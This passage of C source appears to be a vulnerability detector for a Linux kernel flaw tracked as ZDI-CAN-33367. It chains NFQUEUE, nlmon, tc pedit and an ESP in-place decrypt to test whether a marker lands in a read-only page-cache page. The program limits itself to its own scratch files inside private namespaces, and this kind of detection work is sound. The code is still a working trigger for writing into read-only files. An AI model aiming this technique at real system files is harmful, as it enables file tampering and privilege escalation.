	g_full[ETH_HDR + 4] = 0x23; g_full[ETH_HDR + 5] = 0x45;   /* id */
	g_full[ETH_HDR + 6] = 0x00; g_full[ETH_HDR + 7] = 0x00;   /* flags */
	g_full[ETH_HDR + 8] = 64;                                 /* ttl */
	g_full[ETH_HDR + 9] = 50;                                 /* ESP */
	/* checksum filled below */
	g_full[ETH_HDR + 12] = 127; g_full[ETH_HDR + 13] = 0;
	g_full[ETH_HDR + 14] = 0;   g_full[ETH_HDR + 15] = 1;
	g_full[ETH_HDR + 16] = 127; g_full[ETH_HDR + 17] = 0;
	g_full[ETH_HDR + 18] = 0;   g_full[ETH_HDR + 19] = 1;
	g_full[34] = 0x00; g_full[35] = 0x00; g_full[36] = 0x01; g_full[37] = 0x00;
	g_full[38] = 0x00; g_full[39] = 0x00; g_full[40] = 0x00; g_full[41] = 0x01;
	for (i = 0; i < BLK; i++)
		g_full[42 + i] = (uint8_t)(0x40 + i);           /* IV */
	memcpy(g_full + CT0, C, ctlen);
	memcpy(g_full + g_frag, target8, TARGET_BYTES);

	/* IPv4 header checksum. */
	{
		uint32_t sum = 0;
		uint16_t csum;
		for (i = 0; i < IP_HDR; i += 2)
			sum += ((uint32_t)g_full[ETH_HDR + i] << 8) |
			       (uint32_t)g_full[ETH_HDR + i + 1];
		while (sum >> 16)
			sum = (sum & 0xffffu) + (sum >> 16);
		csum = (uint16_t)(~sum & 0xffffu);
		g_full[ETH_HDR + 10] = (uint8_t)(csum >> 8);
		g_full[ETH_HDR + 11] = (uint8_t)csum;
	}

	/* ICV over SPI..end-of-ciphertext. */
	hmac_sha256_trunc(g_full + 34, (size_t)(g_M - ICV_LEN - 34),
			  g_full + g_M - ICV_LEN);

	g_veclen = g_M - g_frag - TARGET_BYTES;

	/* ---- CRYPTO self-check: decrypt the composition, compare P ---- */
	{
		uint8_t *pt = calloc(1, ctlen);
		uint8_t icv2[ICV_LEN];
		int ok;
		if (!pt)
			fail("oom");
		aes_cbc_op(ALG_OP_DECRYPT, g_full + 42, g_full + CT0, ctlen, pt);
		ok = memcmp(pt, P, ctlen) == 0;
		hmac_sha256_trunc(g_full + 34, (size_t)(g_M - ICV_LEN - 34), icv2);
		if (memcmp(icv2, g_full + g_M - ICV_LEN, ICV_LEN) != 0)
			ok = 0;
		probe("CRYPTO self_check=%s aes=cbc(aes)-128 auth=hmac(sha256)-trunc%u spi=0x%x seq=1",
		      ok ? "PASS" : "FAIL", ICV_BITS, ESP_SPI);
		if (!ok)
			fail("ESP composition failed its self-check");
		free(pt);
	}

	probe("FRAME length=%u pedit_keys=%u", g_frag, g_frag / 4u);

	free(P);
	free(C);
}

/* ================================================================== */
/* Stage 8: ESP self-test (inject the composed frame on lo)            */
/* ================================================================== */

static void dump_xfrm_stat(void)
{
	FILE *f = fopen("/proc/net/xfrm_stat", "r");
	char name[64];
	unsigned long v;
	if (!f)
		return;
	printf("DIAG /proc/net/xfrm_stat");
	while (fscanf(f, "%63s %lu", name, &v) == 2) {
		if (v)
			printf(" %s=%lu", name, v);
	}
	printf("\n");
	fclose(f);
}

static void esp_selftest(void)
{
	struct sockaddr_ll sll;
	unsigned lo_idx = if_nametoindex("lo");
	int s, got;

	if (!lo_idx)
		fail("if_nametoindex lo");
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
		fail("socket(AF_PACKET) - CONFIG_PACKET?");
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = (int)lo_idx;
	sll.sll_halen = 0;
	if (sendto(s, g_full, (size_t)g_M, 0, (struct sockaddr *)&sll,
		   sizeof(sll)) != (ssize_t)g_M)
		fail("selftest sendto");
	close(s);

	got = inner_drain("SELFTEST_UDP", 800, (size_t)g_inner_expect);
	probe("ESP_SELFTEST injected=%u inner_udp_received=%s expected_len=%u",
	      g_M, got ? "yes" : "no", g_inner_expect);
	if (!got) {
		dump_xfrm_stat();
		fail("ESP self-test failed: XFRM state/crypto path did not deliver the inner packet");
	}
}

/* ================================================================== */
/* Stage 9: tc u32 + pedit + mirred on nlmon0 egress                   */
/* ================================================================== */

static void tc_setup(void)
{
	struct nb nb;
	unsigned char buf[4096];
	struct tcmsg *tcm;
	size_t m, opts, actions, act, aopt;
	unsigned nlmon_idx = if_nametoindex("nlmon0");
	unsigned lo_idx = if_nametoindex("lo");
	unsigned nkeys = g_frag / 4u, i;
	int rt_fd;

	/* tc_pedit_sel + keys and tc_u32_sel + key, byte-exact buffers
	 * (avoids embedding UAPI structs that end in flexible arrays). */
	uint8_t pbuf[offsetof(struct tc_pedit_sel, keys) +
		     MAX_PEDIT_KEYS * sizeof(struct tc_pedit_key)]
		     __attribute__((aligned(8)));
	uint8_t ubuf[offsetof(struct tc_u32_sel, keys) +
		     sizeof(struct tc_u32_key)] __attribute__((aligned(8)));
	struct tc_pedit_sel *psel;
	struct tc_pedit_key *pkey;
	struct tc_u32_sel *usel;
	struct tc_mirred mirred;

	if (!nlmon_idx || !lo_idx)
		fail("if_nametoindex nlmon0/lo");
	if (nkeys > MAX_PEDIT_KEYS)
		fail("pedit key count %u", nkeys);

	memset(pbuf, 0, sizeof(pbuf));
	psel = (struct tc_pedit_sel *)(void *)pbuf;
	psel->action = TC_ACT_PIPE;
	psel->nkeys = (unsigned char)nkeys;
	pkey = (struct tc_pedit_key *)(void *)(pbuf +
			offsetof(struct tc_pedit_sel, keys));
	for (i = 0; i < nkeys; i++) {
		memcpy(&pkey[i].val, g_full + i * 4u, 4);  /* raw frame bytes */
		pkey[i].mask = 0;                          /* full overwrite  */
		pkey[i].off = i * 4u;
	}

	memset(ubuf, 0, sizeof(ubuf));
	usel = (struct tc_u32_sel *)(void *)ubuf;
	usel->flags = TC_U32_TERMINAL;
	usel->nkeys = 1;      /* single zero key: (data & 0) == 0 -> match all */

	memset(&mirred, 0, sizeof(mirred));
	mirred.action = TC_ACT_STOLEN;
	mirred.eaction = TCA_EGRESS_REDIR;
	mirred.ifindex = (int)lo_idx;

	rt_fd = nl_socket(NETLINK_ROUTE);

	/* clsact qdisc on nlmon0 */
	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb, RTM_NEWQDISC,
			 NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
			 (void **)&tcm, sizeof(*tcm));
	tcm->tcm_family = AF_UNSPEC;
	tcm->tcm_ifindex = (int)nlmon_idx;
	tcm->tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
	tcm->tcm_parent = TC_H_CLSACT;
	nla_put_strz(&nb, TCA_KIND, "clsact");
	nb_msg_end(&nb, m);
	nl_send_buffer(rt_fd, &nb);
	nl_wait_ack(rt_fd, "RTM_NEWQDISC clsact");

	/* u32 match-all filter: pedit(frame) pipe mirred(egress redirect lo) */
	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb, RTM_NEWTFILTER,
			 NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
			 (void **)&tcm, sizeof(*tcm));
	tcm->tcm_family = AF_UNSPEC;
	tcm->tcm_ifindex = (int)nlmon_idx;
	tcm->tcm_parent = TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_EGRESS);
	tcm->tcm_info = TC_H_MAKE(1u << 16, htons(ETH_P_ALL));
	nla_put_strz(&nb, TCA_KIND, "u32");
	opts = nest_begin(&nb, TCA_OPTIONS);
	nla_put_raw(&nb, TCA_U32_SEL, ubuf, sizeof(ubuf));
	actions = nest_begin(&nb, TCA_U32_ACT);

	act = nest_begin(&nb, 1);
	nla_put_strz(&nb, TCA_ACT_KIND, "pedit");
	aopt = nest_begin(&nb, TCA_ACT_OPTIONS);
	nla_put_raw(&nb, TCA_PEDIT_PARMS, pbuf,
		    offsetof(struct tc_pedit_sel, keys) +
		    nkeys * sizeof(struct tc_pedit_key));
	nest_end(&nb, aopt);
	nest_end(&nb, act);

	act = nest_begin(&nb, 2);
	nla_put_strz(&nb, TCA_ACT_KIND, "mirred");
	aopt = nest_begin(&nb, TCA_ACT_OPTIONS);
	nla_put_raw(&nb, TCA_MIRRED_PARMS, &mirred, sizeof(mirred));
	nest_end(&nb, aopt);
	nest_end(&nb, act);

	nest_end(&nb, actions);
	nest_end(&nb, opts);
	nb_msg_end(&nb, m);
	nl_send_buffer(rt_fd, &nb);
	nl_wait_ack(rt_fd, "RTM_NEWTFILTER u32/pedit/mirred");

	probe("TC_NETLINK_SETUP device=nlmon0 hook=egress classifier=u32 pedit_keys=%u redirect=lo status=PASS",
	      nkeys);
	close(rt_fd);
}

/* ================================================================== */
/* Stage 10: trigger + verify                                          */
/* ================================================================== */

static void dump_caps(void)
{
	FILE *f = fopen("/proc/self/status", "r");
	char line[256];
	if (!f)
		return;
	while (fgets(line, sizeof(line), f)) {
		if (strncmp(line, "CapEff:", 7) == 0 ||
		    strncmp(line, "NoNewPrivs:", 11) == 0) {
			size_t n = strlen(line);
			while (n && (line[n-1] == '\n' || line[n-1] == ' '))
				line[--n] = 0;
			printf("CAPS %s\n", line);
		}
	}
	fclose(f);
}

static void run_trigger(int scratch_ro)
{
	unsigned char msg[MAX_MSG];
	static uint8_t content[SCRATCH_SIZE];
	uint8_t window[WINDOW_LEN], orig_win[WINDOW_LEN];
	char hex[65];
	size_t msglen, i;
	unsigned p0, plen, id;
	int vfd_w, vfd_r, sfd;
	uint8_t *mm;
	const char *disk;
	int changed, marker_exact, guards_ok;

	/* Final vector = message bytes after the fixed target bytes. */
	vfd_w = open(g_vector_path, O_RDWR);
	if (vfd_w < 0)
		fail("open vector RW (final)");
	if (pwrite(vfd_w, g_full + g_frag + TARGET_BYTES, (size_t)g_veclen, 0) !=
	    (ssize_t)g_veclen)
		fail("write final vector");
	if (ftruncate(vfd_w, (off_t)g_veclen) < 0)
		fail("ftruncate vector");
	if (fsync(vfd_w) < 0)
		fail("fsync vector");
	if (fchmod(vfd_w, 0444) < 0)
		fail("chmod 0444 vector");
	close(vfd_w);
	vfd_r = open(g_vector_path, O_RDONLY);
	if (vfd_r < 0)
		fail("open vector RO (final)");

	/* WRITE_DENIAL: we (uid 0 in the userns, but without DAC_OVERRIDE
	 * over this inode) cannot open the 0444 scratch file for writing. */
	{
		int w = open(g_scratch_path, O_WRONLY);
		printf("WRITE_DENIAL open(O_WRONLY) errno=%d (%s) denied=%d\n",
		       w < 0 ? errno : 0,
		       w < 0 ? strerror(errno) : "opened",
		       w < 0 ? 1 : 0);
		if (w >= 0)
			close(w);
	}

	/* Fire. */
	send_spliced_via(scratch_ro, vfd_r, (size_t)g_veclen);
	probe("TRIGGER sent=%u target_spliced=%u vector_spliced=%u",
	      TARGET_BYTES + g_veclen, TARGET_BYTES, g_veclen);

	id = nfq_recv_packet(msg, sizeof(msg), &msglen, &p0, &plen, 3000);
	probe("TRIGGER nfq_msglen=%u packet_id=%u (predicted %u)",
	      (unsigned)msglen, id, g_M);
	if ((unsigned)msglen != g_M)
		fail("trigger message length %u != predicted %u - aborting verdict",
		     (unsigned)msglen, g_M);
	if (p0 != g_P0 || plen != 550u + g_d)
		fail("trigger geometry drift (p0=%u plen=%u) - aborting verdict",
		     p0, plen);
	printf("TRIGGER_MSG_HEAD (first 96 bytes of the queued message):\n");
	hexdump_lines(msg, msglen < 96u ? msglen : 96u);
	nfq_send_verdict(id);

	sleep_ms(500);
	{
		int got = inner_drain("INNER_UDP_RECEIVED", 800,
				      (size_t)g_inner_expect);
		printf("TRIGGER inner_udp_decrypted=%s\n", got ? "yes" : "no");
	}
	dump_xfrm_stat();

	/* ---- verdict: fresh reads of the scratch file ---- */
	sfd = open(g_scratch_path, O_RDONLY);
	if (sfd < 0)
		fail("fresh open scratch");
	if (pread(sfd, window, WINDOW_LEN, (off_t)WINDOW_OFF) != (ssize_t)WINDOW_LEN)
		fail("fresh read window");
	if (pread(sfd, content, SCRATCH_SIZE, 0) != (ssize_t)SCRATCH_SIZE)
		fail("fresh read content");
	sha256_hex(content, SCRATCH_SIZE, hex);

	/* The original 40-byte window from the documented fill pattern. */
	for (i = 0; i < WINDOW_LEN; i++)
		orig_win[i] = scratch_byte((size_t)WINDOW_OFF + i);

	changed = memcmp(window + 16, orig_win + 16, TARGET_BYTES) != 0;
	marker_exact = memcmp(window + 16, MARKER, TARGET_BYTES) == 0;
	guards_ok = memcmp(window, orig_win, 16) == 0 &&
		    memcmp(window + 24, orig_win + 24, 16) == 0;

	printf("TARGET_WINDOW_AFTER (%u bytes):\n", WINDOW_LEN);
	hexdump_lines(window, WINDOW_LEN);
	printf("TARGET_SHA256_AFTER=%s\n", hex);
	printf("TRIGGER changed=%d marker_exact=%d guards_ok=%d\n",
	       changed, marker_exact, guards_ok);

	/* mmap view (page cache as seen through a mapping). */
	mm = mmap(NULL, SCRATCH_SIZE, PROT_READ, MAP_PRIVATE, sfd, 0);
	if (mm == MAP_FAILED) {
		printf("MMAP_VIEW error=%s\n", strerror(errno));
	} else {
		printf("MMAP_VIEW target_bytes=");
		for (i = 0; i < TARGET_BYTES; i++)
			printf("%02x", mm[TARGET_OFF + i]);
		printf(" mmap_matches_desired=%d\n",
		       memcmp(mm + TARGET_OFF, MARKER, TARGET_BYTES) == 0);
		munmap(mm, SCRATCH_SIZE);
	}

	/* Vector file (self-owned second oracle: its pages sit in the ct). */
	{
		static uint8_t vbuf[MAX_MSG];
		int vfd = open(g_vector_path, O_RDONLY);
		if (vfd >= 0) {
			if (pread(vfd, vbuf, (size_t)g_veclen, 0) == (ssize_t)g_veclen) {
				int vchanged = memcmp(vbuf,
						       g_full + g_frag + TARGET_BYTES,
						       (size_t)g_veclen) != 0;
				sha256_hex(vbuf, (size_t)g_veclen, hex);
				printf("VECTOR_SHA256_AFTER=%s changed=%d\n", hex,
				       vchanged);
			}
			close(vfd);
		}
	}

	/* DISK-CLEAN evidence (see header for semantics). */
	disk = "SKIPPED";
	if (changed) {
		uint8_t again[WINDOW_LEN];
		posix_fadvise(sfd, 0, 0, POSIX_FADV_DONTNEED);
		if (pread(sfd, again, WINDOW_LEN, (off_t)WINDOW_OFF) ==
		    (ssize_t)WINDOW_LEN) {
			int still = memcmp(again + 16, window + 16,
					   TARGET_BYTES) != 0;
			printf("EVICTION fadvise=DONTNEED window_still_changed=%d\n",
			       still);
			disk = memcmp(again + 16, orig_win + 16,
				      TARGET_BYTES) == 0 ? "CLEAN" : "DIRTY";
		}
	}
	printf("DETECTOR-DISK: %s\n", disk);
	close(sfd);
	close(vfd_r);

	if (changed && guards_ok && marker_exact) {
		printf("DETECTOR-RESULT: VULNERABLE (in-place decrypt wrote over self-owned read-only page-cache page)\n");
		exit(EXIT_VULN);
	}
	if (!changed) {
		printf("DETECTOR-RESULT: NOT-DETECTED (no page-cache divergence; skb_cow_data unshared the frags or a copy path was taken)\n");
		exit(EXIT_NOTDET);
	}
	printf("DETECTOR-FAIL: ambiguous result (changed=%d marker=%d guards=%d)\n",
	       changed, marker_exact, guards_ok);
	exit(EXIT_FAIL);
}

/* ================================================================== */
/* main                                                                */
/* ================================================================== */

static void usage(const char *p)
{
	printf("Usage: %s [--help] [base_dir]\n"
	       "\n"
	       "ZDI-CAN-33367 safe differential oracle. Creates its own scratch\n"
	       "files under <base_dir> (default /tmp) and runs the\n"
	       "NFQUEUE -> skb_zerocopy -> nlmon -> tc pedit -> ESP chain inside a\n"
	       "private user+network namespace against its self-owned read-only\n"
	       "file only. Exit codes: 0 VULNERABLE, 1 NOT-DETECTED, 2 FAIL,\n"
	       "3 SKIPPED (no unprivileged user namespaces).\n", p);
}

int main(int argc, char **argv)
{
	const char *base = "/tmp";
	struct utsname uts;
	uint8_t t8[TARGET_BYTES];
	int scratch_ro, i;

	for (i = 1; i < argc; i++) {
		if (strcmp(argv[i], "--help") == 0) {
			usage(argv[0]);
			return 0;
		}
		base = argv[i];
	}
	setvbuf(stdout, NULL, _IONBF, 0);
	alarm(180);

	g_ruid = getuid();
	g_euid = geteuid();
	g_egid = getegid();

	if (uname(&uts) == 0)
		probe("KERNEL release=%s machine=%s", uts.release, uts.machine);

	probe("OWNERSHIP euid=%u base=%s", (unsigned)g_euid, base);
	create_scratch_files(base);

	scratch_ro = open(g_scratch_path, O_RDONLY);
	if (scratch_ro < 0)
		fail("open scratch RO");
	{
		struct stat st;
		if (fstat(scratch_ro, &st) < 0 || st.st_uid != geteuid())
			fail("scratch fd ownership check");
	}

	enter_namespaces();
	net_setup();
	nft_queue_rule();
	nfq_bind_config();
	run_probe(scratch_ro);
	{
		size_t k;
		for (k = 0; k < TARGET_BYTES; k++)
			t8[k] = scratch_byte((size_t)TARGET_OFF + k);
	}
	compose_esp_frame(t8);
	esp_selftest();
	tc_setup();
	dump_caps();
	run_trigger(scratch_ro);
	return EXIT_FAIL;
}
